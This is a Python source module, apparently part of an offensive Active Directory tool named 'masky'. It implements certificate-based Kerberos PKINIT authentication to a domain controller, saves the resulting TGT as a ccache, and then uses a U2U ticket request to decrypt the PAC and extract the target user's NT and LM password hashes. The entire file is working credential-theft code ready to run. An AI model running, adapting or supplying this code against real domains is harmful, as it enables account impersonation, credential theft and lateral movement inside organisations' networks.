import datetime
import logging
import socket
from random import getrandbits
from typing import Union

from asn1crypto import cms, core
from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncASRepPart,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from .certificate import (
    get_identifications_from_certificate,
    get_object_sid_from_certificate,
    hash_digest,
    hashes,
    cert_id_to_parts,
)
from .pkinit import PA_PK_AS_REP, Enctype, KDCDHKeyInfo, build_pkinit_as_req

logger = logging.getLogger("masky")


def truncate_key(value: bytes, keysize: int) -> bytes:
    output = b""
    current_num = 0
    while len(output) < keysize:
        current_digest = hash_digest(bytes([current_num]) + value, hashes.SHA1)
        if len(output) + len(current_digest) > keysize:
            output += current_digest[: keysize - len(output)]
            break
        output += current_digest
        current_num += 1

    return output


class Authenticate:
    def __init__(self, tracker, dc_domain, dc_ip, user, no_ccache, no_hash):
        self.tracker = tracker
        self.dc_ip = dc_ip
        self.dc_domain = dc_domain
        self.user = user
        self.cert = user.cert
        self.key = user.privatekey
        self.no_ccache = no_ccache
        self.no_hash = no_hash
        self.lm_hash = None
        self.nt_hash = None

    def authenticate(self, is_key_credential=False):
        username = self.user.name
        domain = self.user.domain

        id_type = None
        identification = None
        object_sid = None
        if not is_key_credential:
            identifications = get_identifications_from_certificate(self.cert)

            # Take the first identification automatically, needs improvements
            if len(identifications) != 0:
                id_type, identification = identifications[0]
            else:
                id_type, identification = None, None

            cert_username, cert_domain = cert_id_to_parts([(id_type, identification)])

            object_sid = get_object_sid_from_certificate(self.cert)

            if not any([cert_username, cert_domain]):
                logger.warn("Could not find identification in the provided certificate")

            if not username:
                username = cert_username
            elif cert_username:
                if username.lower() not in [
                    cert_username.lower(),
                    cert_username.lower() + "$",
                ]:
                    logger.debug(
                        (
                            "The provided username does not match the identification "
                            "found in the provided certificate: %s - %s"
                            ", attempting to continue..."
                        )
                        % (repr(username), repr(cert_username))
                    )

            if cert_domain:
                domain = cert_domain

            if domain.lower() != self.user.domain.lower() and not domain.startswith(
                self.user.domain.lower().lower().rstrip(".") + "."
            ):
                logger.debug(
                    (
                        f"The provided domain does not match the identification "
                        f"found in the provided certificate: %s - %s"
                        f", attempting to use '{self.user.domain}' as domain..."
                    )
                    % (repr(domain), repr(self.user.domain))
                )
                domain = self.user.domain

        if not all([username, domain]) and not is_key_credential:
            err_msg = (
                "Username or domain is not specified, and identification "
                "information was not found in the certificate"
            )
            logger.error(err_msg)
            self.tracker.last_error_msg = err_msg
            return False

        if not any([len(username), len(domain)]):
            err_msg = "Username or domain is invalid: %s\\%s" % (domain, username)
            logger.error(err_msg)
            self.tracker.last_error_msg = err_msg
            return False

        if not self.dc_ip:
            try:
                self.dc_ip = socket.gethostbyname(domain)
            except:
                try:
                    self.dc_ip = socket.gethostbyname(self.dc_domain)
                except:
                    err_msg = "The provided DC IP is invalid / not set and the domain could not been resolved"
                    logger.error(err_msg)
                    self.tracker.last_error_msg = err_msg
                    return False

        domain = domain.lower()
        username = username.lower()
        upn = "%s@%s" % (username, domain)

        return self.kerberos_authentication(
            username,
            domain,
            is_key_credential,
            id_type,
            identification,
            object_sid,
            upn,
        )

    def kerberos_authentication(
        self,
        username: str = None,
        domain: str = None,
        is_key_credential: bool = False,
        id_type: str = None,
        identification: str = None,
        object_sid: str = None,
        upn: str = None,
    ) -> Union[str, bool]:
        as_req, diffie = build_pkinit_as_req(username, domain, self.key, self.cert)

        try:
            logger.debug(f"Getting a TGT via the following KDC IP: {self.dc_ip}")
            tgt = sendReceive(as_req, domain, self.dc_ip)
        except KerberosError as e:
            if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                err_msg = f"Name mismatch between certificate and user {repr(username)}"
                logger.error(err_msg)
                if id_type is not None:
                    err_msg = f"Verify that the username {repr(username)} matches the certificate {id_type}: {identification}"
                    logger.error(err_msg)
            elif "KDC_ERR_WRONG_REALM" in str(e) and not is_key_credential:
                err_msg = f"Wrong domain name specified {repr(domain)}"
                logger.error(err_msg)
                if id_type is not None:
                    err_msg = f"Verify that the domain {repr(domain)} matches the certificate {id_type}: {identification}"
                    logger.error(err_msg)
            elif "KDC_ERR_CERTIFICATE_MISMATCH" in str(e) and not is_key_credential:
                err_msg = (
                    f"Object SID mismatch between certificate and user {repr(username)}"
                )
                logger.error(err_msg)
                if object_sid is not None:
                    err_msg = f"Verify that user {repr(username)} has object SID {repr(object_sid)}"
                    logger.error(err_msg)
            else:
                err_msg = f"Got error while trying to request TGT: {str(e)}"
                logger.error(err_msg)
            self.tracker.last_error_msg = err_msg
            return False
        except OSError:
            err_msg = "Cannot connect to the provided KDC host, please check the domain or DC IP parameters"
            logger.error(err_msg)
            self.tracker.last_error_msg = err_msg
            return False

        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        for pa in as_rep["padata"]:
            if pa["padata-type"] == 17:
                pk_as_rep = PA_PK_AS_REP.load(bytes(pa["padata-value"])).native
                break
        else:
            err_msg = "PA_PK_AS_REP was not found in AS_REP"
            logger.error(err_msg)
            self.tracker.last_error_msg = err_msg
            return False

        ci = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
        sd = ci["content"]
        key_info = sd["encap_content_info"]

        if key_info["content_type"] != "1.3.6.1.5.2.3.2":
            err_msg = "Unexpected value for key info content type"
            logger.error(err_msg)
            self.tracker.last_error_msg = err_msg
            return False

        auth_data = KDCDHKeyInfo.load(key_info["content"]).native
        pub_key = int(
            "".join(["1"] + [str(x) for x in auth_data["subjectPublicKey"]]), 2
        )
        pub_key = int.from_bytes(
            core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
            "big",
            signed=False,
        )
        shared_key = diffie.exchange(pub_key)

        server_nonce = pk_as_rep["serverDHNonce"]
        full_key = shared_key + diffie.dh_nonce + server_nonce

        etype = as_rep["enc-part"]["etype"]
        cipher = _enctype_table[etype]
        if etype == Enctype.AES256:
            t_key = truncate_key(full_key, 32)
        elif etype == Enctype.AES128:
            t_key = truncate_key(full_key, 16)
        else:
            err_msg = "Unexpected encryption type in AS_REP"
            logger.error(err_msg)
            self.tracker.last_error_msg = err_msg
            return False

        key = Key(cipher.enctype, t_key)
        enc_data = as_rep["enc-part"]["cipher"]
        dec_data = cipher.decrypt(key, 3, enc_data)
        enc_as_rep_part = decoder.decode(dec_data, asn1Spec=EncASRepPart())[0]

        cipher = _enctype_table[int(enc_as_rep_part["key"]["keytype"])]
        session_key = Key(cipher.enctype, bytes(enc_as_rep_part["key"]["keyvalue"]))

        if not self.no_ccache:
            ccache = CCache()
            ccache.fromTGT(tgt, key, None)
            self.user.ccache = ccache.getData()
            logger.result(f"Gathered ccache for the user '{domain}\\{username}'")

        if not self.no_hash:
            # Try to extract NT hash via U2U
            # https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
            # AP_REQ
            ap_req = AP_REQ()
            ap_req["pvno"] = 5
            ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = []
            ap_req["ap-options"] = constants.encodeFlags(opts)

            ticket = Ticket()
            ticket.from_asn1(as_rep["ticket"])

            seq_set(ap_req, "ticket", ticket.to_asn1)

            authenticator = Authenticator()
            authenticator["authenticator-vno"] = 5

            authenticator["crealm"] = bytes(as_rep["crealm"])

            client_name = Principal()
            client_name.from_asn1(as_rep, "crealm", "cname")

            seq_set(authenticator, "cname", client_name.components_to_asn1)

            now = datetime.datetime.utcnow()
            authenticator["cusec"] = now.microsecond
            authenticator["ctime"] = KerberosTime.to_asn1(now)

            encoded_authenticator = encoder.encode(authenticator)

            encrypted_encoded_authenticator = cipher.encrypt(
                session_key, 7, encoded_authenticator, None
            )

            ap_req["authenticator"] = noValue
            ap_req["authenticator"]["etype"] = cipher.enctype
            ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator

            encoded_ap_req = encoder.encode(ap_req)

            # TGS_REQ
            tgs_req = TGS_REQ()

            tgs_req["pvno"] = 5
            tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

            tgs_req["padata"] = noValue
            tgs_req["padata"][0] = noValue
            tgs_req["padata"][0]["padata-type"] = int(
                constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
            )
            tgs_req["padata"][0]["padata-value"] = encoded_ap_req

            req_body = seq_set(tgs_req, "req-body")

            opts = []
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable.value)
            opts.append(constants.KDCOptions.canonicalize.value)
            opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
            opts.append(constants.KDCOptions.forwardable.value)
            opts.append(constants.KDCOptions.renewable_ok.value)

            req_body["kdc-options"] = constants.encodeFlags(opts)

            server_name = Principal(
                username, type=constants.PrincipalNameType.NT_UNKNOWN.value
            )

            seq_set(req_body, "sname", server_name.components_to_asn1)

            req_body["realm"] = str(as_rep["crealm"])

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

            req_body["till"] = KerberosTime.to_asn1(now)
            req_body["nonce"] = getrandbits(31)
            seq_set_iter(
                req_body,
                "etype",
                (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
            )

            ticket = ticket.to_asn1(TicketAsn1())
            seq_set_iter(req_body, "additional-tickets", (ticket,))
            message = encoder.encode(tgs_req)

            tgs = sendReceive(message, domain, self.dc_ip)

            tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            ciphertext = tgs["ticket"]["enc-part"]["cipher"]

            new_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]

            plaintext = new_cipher.decrypt(session_key, 2, ciphertext)
            special_key = Key(18, t_key)

            data = plaintext
            enc_ticket_part = decoder.decode(data, asn1Spec=EncTicketPart())[0]
            ad_if_relevant = decoder.decode(
                enc_ticket_part["authorization-data"][0]["ad-data"],
                asn1Spec=AD_IF_RELEVANT(),
            )[0]
            pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
            buff = pac_type["Buffers"]

            nt_hash = None
            lm_hash = "aad3b435b51404eeaad3b435b51404ee"

            for _ in range(pac_type["cBuffers"]):
                info_buffer = PAC_INFO_BUFFER(buff)
                data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
                    : info_buffer["cbBufferSize"]
                ]
                if info_buffer["ulType"] == 2:
                    cred_info = PAC_CREDENTIAL_INFO(data)
                    new_cipher = _enctype_table[cred_info["EncryptionType"]]
                    out = new_cipher.decrypt(
                        special_key, 16, cred_info["SerializedData"]
                    )
                    type1 = TypeSerialization1(out)
                    new_data = out[len(type1) + 4 :]
                    pcc = PAC_CREDENTIAL_DATA(new_data)
                    for cred in pcc["Credentials"]:
                        cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                            b"".join(cred["Credentials"])
                        )
                        if any(cred_structs["LmPassword"]):
                            lm_hash = cred_structs["LmPassword"].hex()
                        nt_hash = cred_structs["NtPassword"].hex()
                        break
                    break

                buff = buff[len(info_buffer) :]
            else:
                err_msg = "Could not find credentials in PAC"
                logger.error(err_msg)
                self.tracker.last_error_msg = err_msg
                return False

            self.lm_hash = lm_hash
            self.nt_hash = nt_hash

            if not is_key_credential:
                logger.result(
                    f"Gathered NT hash for the user '{domain}\{username}': {nt_hash}"
                )
                self.user.lm_hash = lm_hash
                self.user.nt_hash = nt_hash
            return True

        return False
